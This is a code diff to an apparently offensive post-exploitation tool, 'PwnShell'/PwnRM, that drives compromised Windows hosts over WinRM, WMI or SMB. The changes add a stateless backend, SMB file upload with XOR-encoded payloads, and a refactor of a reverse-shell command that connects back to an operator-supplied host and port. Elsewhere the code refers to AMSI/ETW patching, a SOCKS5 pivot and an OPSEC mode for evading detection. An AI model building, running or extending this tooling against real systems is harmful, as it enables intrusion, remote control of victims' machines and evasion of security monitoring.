@@ -15,6 +15,7 @@ import subprocess
 from pathlib import PureWindowsPath, Path
 from ipaddress import ip_address
 from base64 import b64decode, b64encode
+from io import BytesIO
 from datetime import datetime
 from typing import Optional, List, Dict, Any, Callable
 from urllib.parse import urlparse
@@ -225,15 +226,25 @@ class PwnShell:
         elapsed = str(datetime.now() - self.start_time).split(".")[0]
         tgt = self.target_info.get("host","?")
         usr = self.target_info.get("user","?")
+        active_runspace = getattr(self, "runspace", None)
+        backend = str(getattr(active_runspace, "backend_name", "winrm"))
+        backend_mode = "persistent" if getattr(active_runspace, "persistent", True) else "stateless"
         socks_status = f"{self.socks_server.bind_port} (Active)" if (self.socks_server and self.socks_server.is_running) else "Inactive"
 
         print(_BANNER)
         print(textwrap.dedent(f"""\
         {BLD}  Operator Platform Info{RST}
           Target  : {c(C,tgt)}    User: {c(G,usr)}
+          Backend : {c(C,backend)} ({backend_mode} PowerShell)
           Elapsed : {elapsed}    Commands: {self.cmd_count}    OPSEC: {c(Y, self.opsec_profile.mode.upper())}
           SOCKS5  : {c(M, socks_status)}
         """))
+        if not getattr(active_runspace, "persistent", True):
+            print(c(
+                Y,
+                "  [!] Stateless fallback: !amsi, AMSI/ETW patching, !noconsolation, "
+                "and !ligolo require --exec-method winrm.\n",
+            ))
 
         syntax_width = 45
         for section, cmds in COMMAND_REGISTRY.items():
@@ -1213,6 +1224,13 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
 
     # ── !noconsolation ───────────────────────────────────────────────────────
     def noconsolation(self, cmdline: str):
+        if not getattr(getattr(self, "runspace", None), "persistent", True):
+            message = (
+                "No-Consolation requires a persistent WinRM runspace; reconnect with "
+                "--exec-method winrm. Stateless WMI/SMB backends create a new PowerShell process per command."
+            )
+            self.write_error(message)
+            return {"status": "error", "error": message}
         args = split_args(cmdline)
         usage = (
             "usage: !noconsolation [native|managed] [--capture-output] "
@@ -1395,10 +1413,10 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
             "Remove-Variable @('sock','sinfo')"
         ]
         self.write_info(c(Y, f"  [*] Spawning reverse shell -> {args[0]}:{args[1]}"))
-        for cmd in cmds:
-            logging.debug(cmd)
-            if self.run_with_interrupt(cmd, self.write_line):
-                return {"status": "interrupted"}
+        script = ";\n".join(cmds)
+        logging.debug(script)
+        if self.run_with_interrupt(script, self.write_line):
+            return {"status": "interrupted"}
         return {"status": "completed"}
 
     # ── !upload (FIX-02, OPT-02) ──────────────────────────────────────────────
@@ -1434,6 +1452,50 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
                 raise OSError(f"Upload exceeds PWNRM_MAX_UL ({max_upload} bytes)")
         except IOError as e:
             self.write_error(str(e)); return {"status": "error", "error": str(e)}
+
+        if not getattr(getattr(self, "runspace", None), "persistent", True):
+            smb = None
+            temp_relative = ""
+            try:
+                remote = dst if dst.drive else PureWindowsPath(self.cwd) / dst
+                remote_path = PureWindowsPath(self._validate_remote_path(str(remote)))
+                if not remote_path.name:
+                    raise ValueError("Remote upload destination must include a filename")
+                share = f"{remote_path.drive.rstrip(':')}$"
+                relative = "\\".join(remote_path.parts[1:])
+                temp_path = remote_path.with_name(f".pwnrm_{secrets.token_hex(8)}.tmp")
+                temp_relative = "\\".join(temp_path.parts[1:])
+                payload = buf if unxor else xorenc(buf, _xor_key)
+                expected = SHA256.new(payload).hexdigest().upper()
+                smb = self._open_authenticated_smb()
+                self.write_info(f"  [~] SMB upload -> {c(C, str(remote_path))}")
+                smb.putFile(share, temp_relative, BytesIO(payload).read)
+                digest = SHA256.new()
+                smb.getFile(share, temp_relative, digest.update)
+                if digest.hexdigest().upper() != expected:
+                    raise OSError("SMB upload integrity check failed")
+                try:
+                    smb.deleteFile(share, relative)
+                except Exception:
+                    pass
+                smb.rename(share, temp_relative, relative)
+                temp_relative = ""
+                self.write_info(c(G, "  [+] Upload complete — SHA-256 verified."))
+                return {"status": "completed"}
+            except (OSError, ValueError) as exc:
+                self.write_error(str(exc))
+                return {"status": "error", "error": str(exc)}
+            finally:
+                if smb is not None:
+                    if temp_relative:
+                        try:
+                            smb.deleteFile(share, temp_relative)
+                        except Exception:
+                            pass
+                    try:
+                        smb.logoff()
+                    except Exception:
+                        pass
 
         temp_raw = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
         try:
@@ -1535,6 +1597,8 @@ Write-Output "PwnRM background No-Consolation job started: $jobId"
         host = parsed.hostname or str(self.target_info.get("host", ""))
         if not host:
             raise ValueError("SMB fast path could not resolve the target host")
+        if isinstance(creds, KrbCredential) and "." not in host and "." in creds.domain:
+            host = f"{host}.{creds.domain}".rstrip(".")
 
         smb = SMBConnection(host, host, timeout=max(30, int(getattr(self.runspace, "timeout", 30))))
         try:
